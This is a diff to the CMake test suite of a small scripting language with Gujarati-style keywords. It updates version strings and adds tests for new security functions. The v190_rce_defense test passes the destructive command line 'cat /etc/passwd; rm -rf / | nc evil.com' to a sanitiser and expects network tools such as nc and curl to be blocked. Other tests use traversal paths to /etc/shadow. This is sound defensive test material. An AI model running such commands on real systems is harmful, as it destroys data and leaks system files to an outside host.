@@ -3189,7 +3189,7 @@ p = platform_nam();
 chhapo (p == "windows" || p == "linux" || p == "macos");
 aavjo
 ]=])
-    set(expected_stdout "1.8.0\n1\n")
+    set(expected_stdout "1.9.0\n1\n")
     set(expected_stderr "")
     set(expect_failure FALSE)
 elseif(TEST_CASE STREQUAL "builtin_env")
@@ -3604,7 +3604,7 @@ chhapo 1;
 aavjo
 ]=])
     set(program_arguments "-v")
-    set(expected_stdout "1.8.0\n")
+    set(expected_stdout "1.9.0\n")
     set(expected_stderr "")
     set(expect_failure FALSE)
 elseif(TEST_CASE STREQUAL "v120_url_and_static_web")
@@ -3963,7 +3963,7 @@ tr = debug_trace(0);
 chhapo tr;
 aavjo
 ]=])
-    set(expected_stdout "1.8.0\n1\n0\n")
+    set(expected_stdout "1.9.0\n1\n0\n")
     set(expected_stderr "")
     set(expect_failure FALSE)
 elseif(TEST_CASE STREQUAL "v140_gujarati_syntax")
@@ -3987,7 +3987,7 @@ elseif(TEST_CASE STREQUAL "v140_gujarati_syntax")
 છાપો મેમ["version"];
 આવજો
 ]=])
-    set(expected_stdout "1\nસુરક્ષિત\n~05X\nXXXXX\n346137\n1\nગુજરાતી\n1.8.0\n")
+    set(expected_stdout "1\nસુરક્ષિત\n~05X\nXXXXX\n346137\n1\nગુજરાતી\n1.9.0\n")
     set(expected_stderr "")
     set(expect_failure FALSE)
     set(language_args --language gu)
@@ -4598,6 +4598,185 @@ elseif(TEST_CASE STREQUAL "v180_gujarati_syntax")
 આવજો
 ]=])
     set(expected_stdout "4\n-2\n1\n3\n2\n30\n0\n50\n0.5\n1\n70000\n1\n1\n42\n1\n1\nગુજરાતી\n2\n0\n3\n1\n1\n*/5 * * * *\n1\n1\n0\n")
+    set(expected_stderr "")
+    set(expect_failure FALSE)
+    set(language_args --language gu)
+elseif(TEST_CASE STREQUAL "v190_rce_defense")
+    set(source [=[aavo
+s = sec_sanitize_shell("cat /etc/passwd; rm -rf / | nc evil.com");
+chhapo s;
+v1 = sec_validate_binary("my_app.exe");
+chhapo v1;
+v2 = sec_validate_binary("nc");
+chhapo v2;
+v3 = sec_validate_binary("powershell.exe");
+chhapo v3;
+esc = sec_shell_escape("hello \"world\"");
+chhapo esc;
+blk = sec_exec_restricted("cat /etc/passwd; rm -rf /");
+chhapo blk;
+aavjo
+]=])
+    set(expected_stdout "cat /etc/passwd rm -rf /  nc evil.com\n1\n0\n0\n\"hello \\\"world\\\"\"\n-2\n")
+    set(expected_stderr "")
+    set(expect_failure FALSE)
+elseif(TEST_CASE STREQUAL "v190_sandbox_perms")
+    set(source [=[aavo
+se = sandbox_enter(1);
+chhapo se;
+can_read = sandbox_check_perm("read");
+chhapo can_read;
+can_write = sandbox_check_perm("write");
+chhapo can_write;
+can_proc = sandbox_check_perm("proc");
+chhapo can_proc;
+mem = sandbox_set_max_memory(1048576);
+chhapo mem;
+tm = sandbox_set_timeout(30);
+chhapo tm;
+aavjo
+]=])
+    set(expected_stdout "1\n1\n0\n0\n1\n1\n")
+    set(expected_stderr "")
+    set(expect_failure FALSE)
+elseif(TEST_CASE STREQUAL "v190_path_traversal")
+    set(source [=[aavo
+p = path_canonical("a/b/../c/./d");
+chhapo p;
+safe1 = path_is_safe("a/c/d", "a");
+chhapo safe1;
+safe2 = path_is_safe("../../etc/shadow", "a");
+chhapo safe2;
+joined = path_safe_join("base/dir", "safe/sub");
+chhapo joined;
+bad_join = path_safe_join("base/dir", "../../etc");
+chhapo (bad_join == "base/dir");
+del_missing = fs_secure_delete("nonexistent_test_file_9999.txt");
+chhapo del_missing;
+sym_safe = fs_is_symlink_safe("data.txt");
+chhapo sym_safe;
+sym_bad = fs_is_symlink_safe("/etc/passwd");
+chhapo sym_bad;
+aavjo
+]=])
+    set(expected_stdout "a/c/d\n1\n0\nbase/dir/safe/sub\n1\n0\n1\n0\n")
+    set(expected_stderr "")
+    set(expect_failure FALSE)
+elseif(TEST_CASE STREQUAL "v190_taint_analysis")
+    set(source [=[aavo
+u = taint_mark("malicious_payload", "untrusted");
+chhapo u;
+is_t = taint_check("this contains malicious_payload inside");
+chhapo is_t;
+is_c = taint_check("harmless string");
+chhapo is_c;
+rep1 = taint_report();
+chhapo rep1["tainted_count"];
+c = taint_cleanse("malicious_payload");
+chhapo c;
+is_t2 = taint_check("malicious_payload");
+chhapo is_t2;
+rep2 = taint_report();
+chhapo rep2["cleansed_count"];
+aavjo
+]=])
+    set(expected_stdout "malicious_payload\n1\n0\n1\nmalicious_payload\n0\n1\n")
+    set(expected_stderr "")
+    set(expect_failure FALSE)
+elseif(TEST_CASE STREQUAL "v190_secure_deserial")
+    set(source [=[aavo
+good_json = sec_json_safe("{\"status\":\"safe\",\"count\":10}");
+chhapo good_json["status"];
+bad_proto = sec_json_safe("{\"__proto__\":{\"admin\":1}}");
+chhapo bad_proto;
+h_valid = sec_verify_hmac("data", "key", hmac_sha256("data", "key"));
+chhapo h_valid;
+h_bad = sec_verify_hmac("data", "key", "0000000000000000000000000000000000000000000000000000000000000000");
+chhapo h_bad;
+masked = sec_mask_sensitive("4111222233334444", "*", 4);
+chhapo masked;
+tok_match = sec_token_compare("secret_token_123", "secret_token_123");
+chhapo tok_match;
+tok_diff = sec_token_compare("secret_token_123", "secret_token_456");
+chhapo tok_diff;
+crc = sec_crc32("123456789");
+chhapo crc;
+aavjo
+]=])
+    set(expected_stdout "safe\nનકામો\n1\n0\n************4444\n1\n0\n3421780262\n")
+    set(expected_stderr "")
+    set(expect_failure FALSE)
+elseif(TEST_CASE STREQUAL "v190_memory_canary")
+    set(source [=[aavo
+g = mem_guard_alloc(64);
+chhapo g["valid"];
+chhapo g["size"];
+c1 = mem_canary_check(g);
+chhapo c1;
+z = mem_zero("sensitive_secret");
+chhapo z;
+f = mem_secure_free(g);
+chhapo f;
+c2 = mem_canary_check(g);
+chhapo c2;
+al = sec_audit_log("sandbox_violation", "WARN");
+chhapo al;
+aavjo
+]=])
+    set(expected_stdout "1\n64\n1\n1\n1\n0\n1\n")
+    set(expected_stderr "")
+    set(expect_failure FALSE)
+elseif(TEST_CASE STREQUAL "v190_gujarati_syntax")
+    set(source [=[આવો
+શુદ્ધ = સુરક્ષા_કમાન્ડ_શુદ્ધ("echo safe; bad");
+છાપો શુદ્ધ;
+બાઇનરી = સુરક્ષા_બાઇનરી_ચકાસો("curl");
+છાપો બાઇનરી;
+એસ્કેપ = સુરક્ષા_કમાન્ડ_એસ્કેપ("test");
+છાપો એસ્કેપ;
+સેન્ડ = સેન્ડબોક્સ_શરૂ(1);
+છાપો સેન્ડ;
+ચકાસો = સેન્ડબોક્સ_ચકાસો("read");
+છાપો ચકાસો;
+મેમ = સેન્ડબોક્સ_મેમરી_મર્યાદા(1000);
+છાપો મેમ;
+સમય = સેન્ડબોક્સ_સમય_મર્યાદા(10);
+છાપો સમય;
+પાથ = પાથ_પ્રમાણિત("a/b/../c");
+છાપો પાથ;
+સુરક્ષિત = પાથ_સુરક્ષિત_છે("a/c", "a");
+છાપો સુરક્ષિત;
+જોડો = પાથ_સુરક્ષિત_જોડો("base", "file.txt");
+છાપો જોડો;
+લિંક = સિમ્બોલિક_લિંક_સુરક્ષિત("safe.txt");
+છાપો લિંક;
+ચિહ્ન = દૂષિત_ચિહ્ન("ખરાબ", "ટેગ");
+છાપો ચિહ્ન;
+ટેઇન્ટ = દૂષિત_ચકાસો("ખરાબ");
+છાપો ટેઇન્ટ;
+ક્લીન = દૂષિત_શુદ્ધ("ખરાબ");
+છાપો ક્લીન;
+અહેવાલ = દૂષિત_અહેવાલ();
+છાપો (અહેવાલ["cleansed_count"] >= 0);
+જેસન = સુરક્ષા_જેસન_સુરક્ષિત("{\"કી\":\"કિંમત\"}");
+છાપો જેસન["કી"];
+સરખાવો = સુરક્ષા_ટોકન_સરખાવો("ટોકન", "ટોકન");
+છાપો સરખાવો;
+છુપાવો = સુરક્ષા_છુપાવો("123456", "#", 2);
+છાપો છુપાવો;
+સીઆરસી = સુરક્ષા_સીઆરસી૩૨("123456789");
+છાપો સીઆરસી;
+મેમરી = મેમરી_રક્ષિત(32);
+છાપો મેમરી["માન્ય"];
+કેનેરી = મેમરી_કેનેરી_ચકાસો(મેમરી);
+છાપો કેનેરી;
+મુક્ત = મેમરી_સુરક્ષિત_મુક્ત(મેમરી);
+છાપો મુક્ત;
+નોંધ = સુરક્ષા_ઓડિટ_નોંધ("લોગ", "સૂચના");
+છાપો નોંધ;
+આવજો
+]=])
+    set(expected_stdout "echo safe bad\n0\n\"test\"\n1\n1\n1\n1\na/c\n1\nbase/file.txt\n1\nખરાબ\n1\nખરાબ\n1\nકિંમત\n1\n####56\n3421780262\n1\n1\n1\n1\n")
     set(expected_stderr "")
     set(expect_failure FALSE)
     set(language_args --language gu)
